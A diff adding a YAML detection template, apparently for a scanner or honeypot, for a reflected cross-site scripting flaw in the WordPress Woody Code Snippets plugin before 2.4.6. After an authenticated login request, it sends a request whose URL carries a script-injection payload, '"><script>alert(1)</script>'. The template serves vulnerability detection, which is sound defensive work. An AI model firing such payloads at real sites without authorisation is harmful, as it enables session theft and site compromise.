@@ -1,0 +1,43 @@
+id: wp-insert-php-xss
+info:
+  name: WordPress Woody Code Snippets <2.4.6 - Cross-Site Scripting
+  author: Akincibor,DhiyaneshDk
+  description: WordPress Woody Code Snippets plugin before 2.4.6 contains a cross-site
+    scripting vulnerability. It does not escape generated URLs before outputting them
+    back in an attribute.
+  severity: high
+  reference:
+  - https://wpscan.com/vulnerability/6d6761b7-0c17-4428-8748-2179732030a3
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+  tags: xss,wp,wordpress,authenticated,woody,wpscan,wp-plugin
+traps:
+- request:
+    method: POST
+    path: /wp-login.php
+    headers:
+      Origin: '{{RootURL}}'
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: wordpress_test_cookie=WP%20Cookie%20check
+    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: import-wbcr_insert_php&a"><script>alert(1)</script>"Woody Code Snippets
+      Import
+- request:
+    method: GET
+    path: /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script>
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
